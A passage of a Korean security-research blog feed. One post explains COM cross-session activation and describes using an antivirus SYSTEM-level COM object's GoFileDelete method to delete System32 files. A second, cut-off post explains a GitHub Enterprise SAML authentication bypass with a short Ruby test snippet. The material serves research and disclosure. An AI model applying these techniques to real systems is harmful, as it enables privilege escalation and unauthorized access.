src="/2025/03/16/ogu123/Com_Object_Part3/KR/2.png" alt><br>&#xAD6C;&#xC131; &#xC694;&#xC18C; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0;&#xC11C; &#xD2B9;&#xC815; DCOM &#xAC1D;&#xCCB4;&#xC758; &#xC18D;&#xC131;&#xC744; &#xD655;&#xC778;&#xD55C; &#xACB0;&#xACFC;, &#xD574;&#xB2F9; &#xAC1D;&#xCCB4;&#xB294; Interactive User(&#xB300;&#xD654;&#xD615; &#xC0AC;&#xC6A9;&#xC790;)&#xB85C; &#xC124;&#xC815;&#xB41C; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC5EC;&#xAE30;&#xC11C; Interactive User&#xB780;, &#xD604;&#xC7AC; &#xB85C;&#xADF8;&#xC778;&#xD55C; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; COM &#xAC1D;&#xCCB4;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xC124;&#xC815;&#xC785;&#xB2C8;&#xB2E4;.</p><p>Cross-Session Activation&#xC774; &#xAC00;&#xB2A5;&#xD55C; COM &#xAC1D;&#xCCB4;&#xB294; Interactive User&#xB85C; &#xC124;&#xC815;&#xB418;&#xC5B4;&#xC57C; &#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; </p><p>&#xC774;&#xB97C; &#xB354; &#xC798; &#xC774;&#xD574;&#xD558;&#xAE30; &#xC704;&#xD574;, Windows Session Isolation &#xAC1C;&#xB150;&#xC744; &#xBA3C;&#xC800; &#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="Windows-Session-Isolation"><a href="#Windows-Session-Isolation" class="headerlink" title="Windows Session Isolation"></a>Windows Session Isolation</h3><p><img src="/2025/03/16/ogu123/Com_Object_Part3/KR/3.png" alt></p><p>Windows XP &#xBC0F; Windows Server 2003 &#xC774;&#xD558; &#xBC84;&#xC804;&#xC5D0;&#xC11C;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xCC98;&#xC74C; &#xB85C;&#xADF8;&#xC778;&#xD558;&#xBA74;, &#xC720;&#xC800; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xACFC; Windows &#xC11C;&#xBE44;&#xC2A4;&#xAC00; &#xBAA8;&#xB450; Session 0&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xACF5;&#xACA9;&#xC790;&#xB4E4;&#xC740; &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD558;&#xC5EC; &#xB192;&#xC740; &#xAD8C;&#xD55C;&#xC744; &#xAC00;&#xC9C4; &#xC11C;&#xBE44;&#xC2A4; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xD0C0;&#xAC9F;&#xC73C;&#xB85C;, &#xC720;&#xC800; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xACFC; &#xC0C1;&#xD638;&#xC791;&#xC6A9;&#xD568;&#xC73C;&#xB85C;&#xC368; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC744; &#xC2DC;&#xB3C4;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/03/16/ogu123/Com_Object_Part3/KR/4.png" alt></p><p>&#xC774; &#xBB38;&#xC81C;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD574; Windows 7 &#xC774;&#xD6C4; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xBCF4;&#xC548; &#xC815;&#xCC45;&#xC774; &#xC801;&#xC6A9;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xB85C;&#xADF8;&#xC778;&#xD55C; &#xC0AC;&#xC6A9;&#xC790;&#xB294; &#xAC01;&#xAE30; &#xB2E4;&#xB978; &#xC138;&#xC158;(1, 2, 3&#x2026;)&#xC744; &#xC21C;&#xCC28;&#xC801;&#xC73C;&#xB85C; &#xD560;&#xB2F9;</li><li>&#xC138;&#xC158; 0&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xC11C;&#xBE44;&#xC2A4;&#xB294; &#xC0AC;&#xC6A9;&#xC790; &#xC138;&#xC158;&#xACFC; &#xC0C1;&#xD638;&#xC791;&#xC6A9;(interact) &#xD560; &#xC218; &#xC5C6;&#xB3C4;&#xB85D; &#xC81C;&#xD55C;</li></ol><p>&#xC774;&#xB85C; &#xC778;&#xD574; &#xC138;&#xC158;&#xC774; &#xC644;&#xC804;&#xD788; &#xBD84;&#xB9AC;&#xB418;&#xBA74;&#xC11C;, &#xC11C;&#xBE44;&#xC2A4;&#xB294; &#xB2E4;&#xB978; &#xC138;&#xC158;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xC0AC;&#xC6A9;&#xC790; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xACFC; &#xC9C1;&#xC811; &#xC0C1;&#xD638;&#xC791;&#xC6A9;&#xD560; &#xC218; &#xC5C6;&#xAC8C; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7F0;&#xB370;.. &#xC5EC;&#xAE30;&#xC11C; Interactive User&#xB85C; &#xC124;&#xC815;&#xB41C; COM &#xAC1D;&#xCCB4;&#xAC00; &#xC874;&#xC7AC;&#xD560; &#xACBD;&#xC6B0; Cross-Session Activation&#xC774; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="Cross-Session-Activation"><a href="#Cross-Session-Activation" class="headerlink" title="Cross-Session Activation"></a>Cross-Session Activation</h3><p>Cross-Session Activation&#xC740; &#xB9D0; &#xADF8;&#xB300;&#xB3C4; &#xC138;&#xC158; &#xAC04; COM &#xAC1D;&#xCCB4;&#xB97C; &#xD65C;&#xC131;&#xD654;&#xD558;&#xB294; &#xAE30;&#xBC95;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB97C; &#xB9CC;&#xC871;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; interactive user &#xB9D0;&#xACE0;&#xB3C4; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xC870;&#xAC74;&#xC744; &#xB9CC;&#xC871;&#xD574;&#xC57C; Session Moniker&#xB97C; &#xD1B5;&#xD574; &#xC138;&#xC158; &#xAC04; COM &#xAC1D;&#xCCB4;&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><ul><li>COM &#xAC1D;&#xCCB4;&#xC758; &#xC2DC;&#xC791; &#xBC0F; &#xD65C;&#xC131;&#xD654; &#xAD8C;&#xD55C;&#xC5D0; INTERACTIVE &#xC874;&#xC7AC;</li><li>&#xD504;&#xB85C;&#xC138;&#xC2A4; Access Security&#xC5D0; &#xC801;&#xC808;&#xD55C; &#xAD8C;&#xD55C; &#xC874;&#xC7AC;(Authenticated Users, &#x2026;)</li></ul><p><img src="/2025/03/16/ogu123/Com_Object_Part3/KR/5.png" alt></p><blockquote><p>&#xCD9C;&#xCC98; : <a href="https://decoder.cloud/2024/08/02/the-fake-potato/">Windows File Explorer EoP(CVE-2024-38100)</a></p></blockquote><p>CVE-2024-38100&#xC740; Explorer(Hight IL) &#xB0B4;&#xC5D0; DCOM &#xAC1D;&#xCCB4;&#xAC00; Cross-Session Activation &#xC870;&#xAC74;&#xC744; &#xBAA8;&#xB450; &#xB9CC;&#xC871;&#xD558;&#xACE0;, ShellExecute &#xBA54;&#xC18C;&#xB4DC;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC5B4; COM Cross-Session Activation&#xC73C;&#xB85C; &#xC778;&#xD55C; EoP &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>MS&#xC5D0;&#xC11C;&#xB294; Cross-Session Activation&#xC774; Interactive User&#xC5D0;&#xC11C;&#xB9CC; &#xAC00;&#xB2A5;&#xD558;&#xB2E4;&#xACE0; &#xD588;&#xC9C0;&#xB9CC;, <a href="https://issues.chromium.org/issues/341803763">Chrome Updater EoP(CVE-2024-7023)</a>&#xB97C; &#xD1B5;&#xD574; SYSTEM&#xB3C4; Cross-Session Activation &#xAC00;&#xB2A5;&#xD55C; &#xAC83;&#xC73C;&#xB85C; &#xBC1D;&#xD600;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="Cross-Session-Activation-COM-&#xCC3E;&#xAE30;"><a href="#Cross-Session-Activation-COM-&#xCC3E;&#xAE30;" class="headerlink" title="Cross Session Activation COM &#xCC3E;&#xAE30;"></a>Cross Session Activation COM &#xCC3E;&#xAE30;</h3><p>Cross Session Activation&#xC5D0; &#xD65C;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; COM &#xAC1D;&#xCCB4;&#xB294; &#xC5B4;&#xB5BB;&#xAC8C; &#xCC3E;&#xC744;&#xAE4C;&#xC694;?</p><p><img src="/2025/03/16/ogu123/Com_Object_Part3/KR/6.png" alt></p><p>&#xBA3C;&#xC800; PowerShell&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xB4F1;&#xB85D;&#xB41C; &#xBAA8;&#xB4E0; COM &#xAC1D;&#xCCB4;&#xC5D0;&#xC11C; &#x201C;Interactive User&#x201D;&#xB85C; &#xD544;&#xD130;&#xB9C1;&#xD558;&#xACE0;, &#xC55E;&#xC11C; &#xC5EC;&#xB7EC; &#xC870;&#xAC74;&#xB4E4;&#xC744; &#xB9CC;&#xC871;&#xD558;&#xB294;&#xC9C0; &#xD558;&#xB098;&#xD558;&#xB098; &#xD655;&#xC778;&#xD558;&#xBA74;&#xC11C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC81C;&#xAC00; &#xCD94;&#xCC9C;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC740; <a href="https://github.com/CICADA8-Research/COMThanasia">COMThanasia Tool</a>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9BC;&#xCC98;&#xB7FC; RunAs, AppID, CLSID &#xB4F1;&#xC758; &#xC815;&#xBCF4;&#xB97C; &#xD55C;&#xB208;&#xC5D0; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC5B4; &#xD6E8;&#xC52C; &#xD3B8;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="&#xD2B9;&#xC815;-&#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C;-&#xCDE8;&#xC57D;&#xD55C;-COM-&#xCC3E;&#xAE30;"><a href="#&#xD2B9;&#xC815;-&#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C;-&#xCDE8;&#xC57D;&#xD55C;-COM-&#xCC3E;&#xAE30;" class="headerlink" title="&#xD2B9;&#xC815; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xD55C; COM &#xCC3E;&#xAE30;"></a>&#xD2B9;&#xC815; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xD55C; COM &#xCC3E;&#xAE30;</h3><p>&#xC774;&#xC81C; Part2&#xB97C; &#xC774;&#xC5B4;&#xC11C; Antivirus &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xD55C; COM &#xAC1D;&#xCCB4;&#xB97C; &#xCC3E;&#xC544;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p><img src="/2025/03/16/ogu123/Com_Object_Part3/KR/7.png" alt></p><p>Launch &#xAD8C;&#xD55C;&#xB9CC; &#xD655;&#xC778;&#xD55C; &#xACB0;&#xACFC;, &#xD0C0;&#xAC9F; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xACFC; &#xAD00;&#xB828;&#xB41C; &#xAC83;&#xC73C;&#xB85C; &#xBCF4;&#xC774;&#xB294; Name(A)&#xB97C; &#xD655;&#xC778;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; AppID(xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx) &#xAC1D;&#xCCB4;&#xB294; &#xC0AC;&#xC6A9;&#xC740; &#xBD88;&#xAC00;&#xB2A5;&#xD558;&#xB2E4;&#xACE0; &#xB098;&#xC624;&#xB294;&#xB370;, &#xC815;&#xC801; &#xBD84;&#xC11D; &#xACB0;&#xACFC;&#xC774;&#xBBC0;&#xB85C; &#xAC1D;&#xCCB4;&#xB97C; &#xC0DD;&#xC131; &#xD6C4; &#xB2E4;&#xC2DC; &#xD655;&#xC778;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC88B;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/03/16/ogu123/Com_Object_Part3/KR/8.png" alt></p><p>AppID(xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx)&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; CLSID&#xC744; &#xCC3E;&#xC740; &#xACB0;&#xACFC;, &#xB450; &#xAC1C;&#xC758; CLSID&#xB97C; &#xD655;&#xC778;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>xxxxxxxx-xxxx-xxxx-AAAA-AAAAAAAAAAAA (File Handler)</li><li>xxxxxxxx-xxxx-xxxx-BBBB-BBBBBBBBBBBB</li></ul><p><img src="/2025/03/16/ogu123/Com_Object_Part3/KR/9.png" alt></p><p>&#xBA3C;&#xC800; OleView.Net&#xB97C; &#xD1B5;&#xD574; xxxxxxxx-xxxx-xxxx-AAAA-AAAAAAAAAAAA (File Handler) CLSID&#xB97C; &#xD655;&#xC778;&#xD55C; &#xACB0;&#xACFC;, &#xC6B4;&#xC774; &#xC88B;&#xAC8C; IDispatch &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xC640; Typelib&#xB97C; &#xD655;&#xC778;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p><img src="/2025/03/16/ogu123/Com_Object_Part3/KR/10.png" alt></p><p>&#xB5A8;&#xB9AC;&#xB294; &#xB9C8;&#xC74C;&#xC73C;&#xB85C; Typelib&#xB97C; &#xC0B4;&#xD3B4;&#xBCF8; &#xACB0;&#xACFC;, File Handler &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4; &#xB0B4;&#xC5D0; &#xC5EC;&#xB7EC; &#xD30C;&#xC77C; &#xAD00;&#xB828; &#xBA54;&#xC18C;&#xB4DC;&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xC911; GoFileDelete &#xBA54;&#xC18C;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; File Delete &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xBA3C;&#xC800; &#xC0DD;&#xAC01;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/03/16/ogu123/Com_Object_Part3/KR/11.png" alt></p><p>&#xC9C0;&#xAE08;&#xAE4C;&#xC9C0; &#xB0B4;&#xC6A9;&#xC744; &#xC815;&#xB9AC;&#xD558;&#xBA74;, CLSID(xxxxxxxx-xxxx-xxxx-AAAA-AAAAAAAAAAAA)&#xB294; TARGET.exe &#xB0B4;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; COM &#xAC1D;&#xCCB4;&#xC774;&#xACE0;, TARGET.exe&#xC758; IL(Integrity Level)&#xC774; System &#xC784;&#xC744; &#xD655;&#xC778;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; COM &#xAC1D;&#xCCB4;&#xC758; Application Identity &#xAC12;&#xC744; &#xD655;&#xC778;&#xD574;&#xC57C; &#xD558;&#xC9C0;&#xB9CC;, &#xC774;&#xBBF8; &#xC81C;&#xB85C;&#xB370;&#xC774;&#xB97C; &#xCC3E;&#xC558;&#xB2E4;&#xB294; &#xC0DD;&#xAC01;&#xC5D0; &#xD655;&#xC778;&#xC744; &#xC548; &#xD558;&#xACE0; &#xBC14;&#xB85C; GoFileDelete &#xBA54;&#xC18C;&#xB4DC;&#xB97C; &#xC0AC;&#xC6A9;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/03/16/ogu123/Com_Object_Part3/KR/12.png" alt></p><p>GoFileDelete &#xBA54;&#xC18C;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; System32 &#xD3F4;&#xB354; &#xC548;&#xC5D0; notepad.exe &#xC0AD;&#xC81C;&#xD558;&#xB824; &#xD588;&#xC9C0;&#xB9CC; &#xC2E4;&#xD328;&#xD574;&#xC11C;&#x2026;</p><p>&#xC88C;&#xC808;&#xD558;&#xBA70; &#xADF8; &#xB2F9;&#xC2DC;&#xC5D0;&#xB294; Application Identity &#xAC12;&#xC774; The Launching User&#xB77C;&#xACE0;&#xB9CC; &#xC0DD;&#xAC01; &#xD6C4; &#xB118;&#xC5B4;&#xAC14;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xD558;</p><p><img src="/2025/03/16/ogu123/Com_Object_Part3/KR/13.png" alt></p><p>&#xC5F0;&#xAD6C;&#xAE00;&#xC744; &#xC4F0;&#xBA74;&#xC11C;, Application Identity &#xD655;&#xC778;&#xC744; &#xC548; &#xD588;&#xB358; &#xAC8C; &#xC0DD;&#xAC01;&#xB098;&#xC11C; &#xD655;&#xC778;&#xD55C; &#xACB0;&#xACFC; SYSTEM&#xC774;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;?!</p><p>&#xADF8;&#xB7FC; &#xC65C;? GoFileDelete &#xBA54;&#xC18C;&#xB4DC;&#xAC00; &#xC2E4;&#xD328;&#xD588;&#xC9C0; &#xC0DD;&#xAC01;&#xD574; &#xBCF8; &#xACB0;&#xACFC; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xCD94;&#xCE21;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>File Delete &#xD558;&#xAE30; &#xC804;, C:\Windows, C:\windows\system32, C:\Program Files&#xC640; &#xAC19;&#xC774; &#xBCF4;&#xD638;&#xB41C; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xB0B4;&#xC5D0; &#xD30C;&#xC77C;&#xC740; &#xD544;&#xD130;&#xB9C1;&#xC740; &#xD55C;&#xB2E4;</li><li>.exe, .dll, .db &#xB4F1; &#xD30C;&#xC77C; &#xD655;&#xC7A5;&#xC790;&#xBA85;&#xC744; &#xBE14;&#xB799;&#xB9AC;&#xC2A4;&#xD2B8;&#xB85C; &#xB123;&#xC5B4;&#xC11C; &#xD544;&#xD130;&#xB9C1;&#xD55C;&#xB2E4;</li></ol><p><img src="/2025/03/16/ogu123/Com_Object_Part3/KR/14.png" alt></p><p>System32 &#xD3F4;&#xB354;&#xC5D0; &#xC788;&#xB294; &#xBAA8;&#xB4E0; &#xD30C;&#xC77C;&#xC5D0; GoFileDelete &#xD55C; &#xACB0;&#xACFC; exe, dll, db&#xC640; &#xAC19;&#xC740; &#xD30C;&#xC77C;&#xC740; &#xC0AD;&#xC81C;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xC9C0;&#xB9CC; ini, chm &#xD30C;&#xC77C; &#xB4F1;&#xC740; &#xC0AD;&#xC81C; &#xAC00;&#xB2A5;&#xD558;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7FC;&#x2026; &#xC774;&#xC81C; &#xB0A8;&#xC740; &#xAC74; IDA&#xB97C; &#xD1B5;&#xD574; &#xC815;&#xD655;&#xD788; GoFileDelete &#xBA54;&#xC18C;&#xB4DC;&#xAC00; &#xC5B4;&#xB5A4; &#xD30C;&#xC77C;&#xC744; &#xC0AD;&#xC81C; &#xAC00;&#xB2A5;&#xD55C;&#xC9C0; &#xD655;&#xC778;&#xC744; &#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;! (&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026;)</p><h3 id="&#xB9C8;&#xCE58;&#xBA70;"><a href="#&#xB9C8;&#xCE58;&#xBA70;" class="headerlink" title="&#xB9C8;&#xCE58;&#xBA70;"></a>&#xB9C8;&#xCE58;&#xBA70;</h3><p>&#xC774;&#xBC88; &#xAE00;&#xC744; &#xD1B5;&#xD574; Cross Session Activation &#xAC1C;&#xB150;&#xACFC; AntiVirus &#xB0B4;&#xC5D0; COM&#xC5D0;&#xC11C; File Delete &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xC744; &#xBED4;&#xD55C; &#xB0B4;&#xC6A9;&#xC744; &#xC0B4;&#xD3B4;&#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026;!</p><p>&#xC774;&#xC81C; IDA&#xB85C; &#xBD84;&#xC11D; &#xD6C4; File Delete &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xAC70;&#xB098; &#xC815; &#xC548;&#xB41C;&#xB2E4;&#xBA74;, &#xD30C;&#xC77C; &#xAD00;&#xB828; &#xB2E4;&#xB978; &#xBA54;&#xC18C;&#xB4DC;&#xB3C4; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC798; &#xC5EE;&#xC5B4;&#xC11C; COM &#xC81C;&#xB85C;&#xB370;&#xC774;&#xB97C; &#xB4E4;&#xACE0; &#xC624;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. (&#xB098;&#xB294; &#xC65C; Execute &#xBA54;&#xC18C;&#xB4DC;&#xAC00; &#xC5C6;&#xC9C0;..)</p><p>&#xAE34; &#xAE00; &#xC77D;&#xC5B4;&#xC8FC;&#xC154;&#xC11C; &#xAC10;&#xC0AC;&#xD569;&#xB2C8;&#xB2F9; &#x314E;&#x314E;</p><h3 id="&#xCC38;&#xACE0;"><a href="#&#xCC38;&#xACE0;" class="headerlink" title="&#xCC38;&#xACE0;"></a>&#xCC38;&#xACE0;</h3><ul><li><p><a href="https://www.tiraniddo.dev/2018/09/finding-interactive-user-com-objects_9.html">https://www.tiraniddo.dev/2018/09/finding-interactive-user-com-objects_9.html</a></p></li><li><p><a href="https://blog.compass-security.com/2024/10/com-cross-session-activation/">https://blog.compass-security.com/2024/10/com-cross-session-activation/</a></p></li><li><p><a href="https://note-ing.tistory.com/65">https://note-ing.tistory.com/65</a></p></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/COM-Object/">COM Object</category>
      
      <category domain="https://hackyboiz.github.io/tags/ogu123/">ogu123</category>
      
      <category domain="https://hackyboiz.github.io/tags/Cross-Session-Activation/">Cross-Session Activation</category>
      
      <category domain="https://hackyboiz.github.io/tags/Windows-Session-Isolation/">Windows Session Isolation</category>
      
      <category domain="https://hackyboiz.github.io/tags/AntiVirus/">AntiVirus</category>
      
      
      <comments>https://hackyboiz.github.io/2025/03/16/ogu123/Com_Object_Part3/KR/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-9487: GitHub Enterprise SAML Authentication Bypass 취약점</title>
      <link>https://hackyboiz.github.io/2025/03/15/mungsul/2025-03-15/</link>
      <guid>https://hackyboiz.github.io/2025/03/15/mungsul/2025-03-15/</guid>
      <pubDate>Sat, 15 Mar 2025 11:10:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://projectdiscovery.io/blog/github-enterprise-</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://projectdiscovery.io/blog/github-enterprise-saml-authentication-bypass">https://projectdiscovery.io/blog/github-enterprise-saml-authentication-bypass</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Github Enterprise Server &#x2264; 3.11.15</li><li>Github Enterprise Server &#x2264; 3.12.9</li><li>Github Enterprise Server &#x2264; 3.13.4</li><li>Github Enterprise Server &#x2264; 3.14.1</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>GitHub Enterprise &#xC758; SAML &#xC778;&#xC99D;&#xC5D0;&#xC11C; &#xAC80;&#xC99D; &#xACFC;&#xC815; &#xBBF8;&#xD761;&#xC73C;&#xB85C; &#xC778;&#xC99D; &#xC6B0;&#xD68C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC804;&#xC5D0; GitLab &#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; SAML &#xC778;&#xC99D; &#xC6B0;&#xD68C;&#xC640; &#xBE44;&#xC2B7;&#xD55C; &#xBCA1;&#xD130;&#xC778;&#xB370;&#xC694;. GitLab SAML &#xC778;&#xC99D; &#xC6B0;&#xD68C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xAD81;&#xAE08;&#xD558;&#xC2DC;&#xB2E4;&#xBA74; <a href="https://hackyboiz.github.io/2024/10/19/mungsul/2024-10-19/">&#xC774; &#xAE00;</a>&#xC744; &#xCC38;&#xACE0;&#xD574;&#xC8FC;&#xC138;&#xC694;.</p><p><strong>GitHub SAML &#xC778;&#xC99D;</strong></p><p>SAML &#xC778;&#xC99D;&#xC740; IdP &#xC5D0;&#xC11C; &#xBC1C;&#xAE09;&#xD55C; SAML Response &#xB97C; SP&#xAC00; &#xAC80;&#xC99D;&#xD558;&#xC5EC; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xAE30;&#xC5B5;&#xD558;&#xC2DC;&#xB098;&#xC694;? GitHub Enterprise &#xB3C4; &#xC774;&#xC640; &#xAC19;&#xC740; &#xBC29;&#xC2DD;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. SAML Response &#xC758; Assertion &#xC5D0;&#xB294; &#xAD8C;&#xD55C; &#xC815;&#xBCF4;&#xAC00; &#xB2F4;&#xAE30;&#xACE0; Signature &#xAC80;&#xC99D;&#xC744; &#xD1B5;&#xD574; &#xBB34;&#xACB0;&#xC131;&#xC744; &#xBCF4;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xB2E4;&#xC74C;&#xC740; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xBC1C;&#xACAC;&#xD55C; &#xC5F0;&#xAD6C;&#xC6D0;&#xB4E4;&#xC774; GitHub Enterprise &#xB85C;&#xCEEC; &#xD658;&#xACBD;&#xC5D0;&#xC11C; SAML &#xC778;&#xC99D; &#xD14C;&#xC2A4;&#xD2B8;&#xB97C; &#xC704;&#xD574; &#xC791;&#xC131;&#xD55C; &#xCF54;&#xB4DC; &#xC911; &#xC77C;&#xBD80;&#xC785;&#xB2C8;&#xB2E4;. resp.xml &#xC774; SAML Response &#xC774;&#xACE0; &#xD30C;&#xC2F1;&#xC740; [1] &#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xD558;&#xB294; from_param &#xC744; &#xD1B5;&#xD574; &#xC774;&#xB904;&#xC9D1;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574; xml &#xAC1D;&#xCCB4;&#xB85C; &#xBCC0;&#xD658;&#xB418;&#xBA70; <code>valid?</code> &#xBA54;&#xC18C;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; &#xAC80;&#xC99D;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">saml_resp = Base64.encode64(File.open(<span class="hljs-string">&apos;resp.xml&apos;</span>).read())xml = ::SAML::Message::Response.from_param(saml_resp, @prop1) [<span class="hljs-number">1</span>]puts <span class="hljs-string">&quot;Signature verified: &quot;</span> + <span class="hljs-built_in">String</span>(xml.valid?(@props)) [<span class="hljs-number">2</span>]</code></pre><p>&#xC138;&#xBD80; &#xACFC;&#xC815;&#xC73C;&#xB85C;&#xB294; &#xB2E4;&#xC74C; &#xD750;&#xB984;&#xC73C;&#xB85C; &#xC218;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><ol><li><code>from_param</code> &#xD638;&#xCD9C;</li><li><code>build()</code> : SAML Response &#xC5D0;&#xC11C; Signature &#xCD94;&#xCD9C;</li><li><code>decrypt()</code> : &#xC554;&#xD638;&#xD654;&#xB41C; 